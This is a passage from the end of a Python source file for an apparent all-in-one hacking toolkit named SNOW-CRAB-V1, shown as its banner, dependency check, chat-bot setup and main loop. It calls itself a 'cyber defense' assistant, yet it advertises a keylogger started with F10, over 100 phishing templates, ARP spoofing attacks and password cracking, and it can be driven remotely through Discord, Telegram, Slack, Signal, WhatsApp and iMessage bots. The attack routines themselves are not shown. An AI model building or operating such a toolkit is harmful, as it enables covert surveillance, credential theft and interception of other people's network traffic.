║{Colors.SUCCESS}  • 🌐 100+ Phishing Templates         • 🎬 Terminal Animations       {Colors.BLUE}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.WHITE}                    🎯 ACCURATE CYBER DEFENSE                           {Colors.BLUE}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SUCCESS}❄️ Welcome to SNOW-CRAB-V1 - Your Ultimate Security Assistant{Colors.RESET}
{Colors.BLUE}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.BLUE}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.BLUE}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.BLUE}📧 Use 'email_compose' to compose and send emails{Colors.RESET}
{Colors.BLUE}📊 Use 'report_generate' to generate PDF reports{Colors.RESET}
{Colors.BLUE}🔓 Use 'crack' commands for password cracking{Colors.RESET}
{Colors.BLUE}🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}
{Colors.BLUE}📡 Use 'mac_info' for MAC address information{Colors.RESET}
{Colors.BLUE}🌐 Use 'nat_info' for NAT information{Colors.RESET}
{Colors.BLUE}🎬 Use 'anim_*' for terminal animations{Colors.RESET}
{Colors.BLUE}🔍 Use 'shodan_*' for Shodan integration{Colors.RESET}
{Colors.BLUE}🎣 Use 'list_templates' to view 100+ phishing templates{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        """Check and display dependency status"""
        print(f"\n{Colors.BLUE}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'wget', 'docker', 'hashcat', 'whois']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        deps = [
            ('paramiko', PARAMIKO_AVAILABLE, 'SSH disabled'),
            ('scapy', SCAPY_AVAILABLE, 'Advanced traffic/ARP disabled'),
            ('discord.py', DISCORD_AVAILABLE, 'Discord disabled'),
            ('telethon', TELETHON_AVAILABLE, 'Telegram disabled'),
            ('slack-sdk', SLACK_AVAILABLE, 'Slack disabled'),
            ('flask', WEB_AVAILABLE, 'Web dashboard disabled'),
            ('pynput', PYNPUT_AVAILABLE, 'Keylogger disabled'),
            ('dnspython', DNS_AVAILABLE, 'DNS features limited'),
            ('reportlab', PDF_AVAILABLE, 'PDF reports disabled'),
            ('shodan', SHODAN_AVAILABLE, 'Shodan disabled'),
            ('selenium', SELENIUM_AVAILABLE, 'WhatsApp disabled')
        ]
        
        for name, available, message in deps:
            if available:
                print(f"{Colors.SUCCESS}✅ {name}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {name} not found - {message}{Colors.RESET}")
        
        if shutil.which('signal-cli'):
            print(f"{Colors.SUCCESS}✅ signal-cli{Colors.RESET}")
        else:
            print(f"{Colors.WARNING}⚠️ signal-cli not found - Signal disabled{Colors.RESET}")
    
    def setup_platforms(self):
        """Configure platform integrations"""
        print(f"\n{Colors.BLUE}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.BLUE}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.BLUE}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.BLUE}Enter Discord bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.BLUE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BLUE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.config.set('discord.enabled', True)
                self.config.set('discord.token', token)
                self.config.set('discord.channel_id', channel)
                self.config.set('discord.prefix', prefix)
                print(f"{Colors.SUCCESS}✅ Discord bot configured{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.BLUE}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.BLUE}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.BLUE}Enter chat ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BLUE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if token:
                self.config.set('telegram.enabled', True)
                self.config.set('telegram.bot_token', token)
                self.config.set('telegram.chat_id', chat_id)
                self.config.set('telegram.prefix', prefix)
                print(f"{Colors.SUCCESS}✅ Telegram bot configured{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.BLUE}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.BLUE}Enter Slack bot token: {Colors.RESET}").strip()
            channel = input(f"{Colors.BLUE}Enter channel ID: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BLUE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if token:
                self.config.set('slack.enabled', True)
                self.config.set('slack.bot_token', token)
                self.config.set('slack.channel_id', channel)
                self.config.set('slack.prefix', prefix)
                print(f"{Colors.SUCCESS}✅ Slack bot configured{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.BLUE}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.BLUE}Enter phone number: {Colors.RESET}").strip()
            group = input(f"{Colors.BLUE}Enter group ID (optional): {Colors.RESET}").strip()
            prefix = input(f"{Colors.BLUE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.config.set('signal.enabled', True)
                self.config.set('signal.phone_number', phone)
                self.config.set('signal.group_id', group)
                self.config.set('signal.prefix', prefix)
                print(f"{Colors.SUCCESS}✅ Signal bot configured{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.BLUE}Configure Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.BLUE}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BLUE}Enter command prefix (default: /): {Colors.RESET}").strip() or '/'
            if webhook:
                self.config.set('google_chat.enabled', True)
                self.config.set('google_chat.webhook_url', webhook)
                self.config.set('google_chat.prefix', prefix)
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.BLUE}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.BLUE}Enter WhatsApp phone number: {Colors.RESET}").strip()
            prefix = input(f"{Colors.BLUE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
            if phone:
                self.config.set('whatsapp.enabled', True)
                self.config.set('whatsapp.phone_number', phone)
                self.config.set('whatsapp.prefix', prefix)
                print(f"{Colors.SUCCESS}✅ WhatsApp bot configured{Colors.RESET}")
        
        # iMessage (macOS only)
        if platform.system() == 'Darwin':
            setup = input(f"{Colors.BLUE}Configure iMessage bot? (y/n): {Colors.RESET}").strip().lower()
            if setup == 'y':
                numbers = input(f"{Colors.BLUE}Enter phone numbers (comma-separated): {Colors.RESET}").strip()
                prefix = input(f"{Colors.BLUE}Enter command prefix (default: !): {Colors.RESET}").strip() or '!'
                if numbers:
                    self.config.set('imessage.enabled', True)
                    self.config.set('imessage.phone_numbers', [n.strip() for n in numbers.split(',')])
                    self.config.set('imessage.prefix', prefix)
                    print(f"{Colors.SUCCESS}✅ iMessage bot configured{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.BLUE}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.BLUE}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            self.config.set('web.port', int(port))
            self.config.set('web.enabled', True)
            print(f"{Colors.SUCCESS}✅ Web dashboard configured{Colors.RESET}")
        
        # Keylogger
        setup = input(f"{Colors.BLUE}Enable keylogger? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            if self.keylogger:
                self.config.set('keylogger.enabled', True)
                self.config.save()
                print(f"{Colors.SUCCESS}✅ Keylogger configured. Press F10 to start/stop.{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ Keylogger not available (pynput missing){Colors.RESET}")
        
        self.config.save()
    
    def run(self):
        """Run the main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Show startup animations
        TerminalAnimation.snowflake_fall(1.5)
        TerminalAnimation.matrix_rain(1.5)
        TerminalAnimation.pulse_animation("❄️ SNOW-CRAB-V1", 1.5)
        TerminalAnimation.crab_walk(1.5)
        
        self.print_banner()
        self.check_dependencies()
        
        # Ask about network monitoring
        auto_monitor = input(f"\n{Colors.BLUE}Start network monitoring? (y/n): {Colors.RESET}").strip().lower()
        if auto_monitor == 'y':
            if self.network_monitor:
                self.network_monitor.start()
                print(f"{Colors.SUCCESS}✅ Network monitoring started{Colors.RESET}")
        
        # Ask about platform setup
        setup_platforms = input(f"{Colors.BLUE}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        # Show final status
        TerminalAnimation.wave_animation("❄️ SNOW-CRAB-V1 READY", 2.0)
        
        print(f"\n{Colors.SUCCESS}✅ SNOW-CRAB-V1 ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.BLUE}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.BLUE}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.BLUE}   🌐 Web dashboard: http://localhost:5000{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.BLUE}[{Colors.WHITE}{self.session_id}{Colors.BLUE}]{Colors.WHITE} ❄️> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        if self.network_monitor:
            self.network_monitor.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.BLUE}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.BLUE}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.BLUE}📊 Reports: {PDF_REPORTS_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point for SNOW-CRAB-V1"""
    try:
        print(f"{Colors.BLUE}❄️ Starting SNOW-CRAB-V1...{Colors.RESET}")
        
        # Check Python version
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        # Check for admin/root privileges
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality (firewall, raw sockets){Colors.RESET}")
        
        # Create and run the application
        app = SnowCrabV1()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
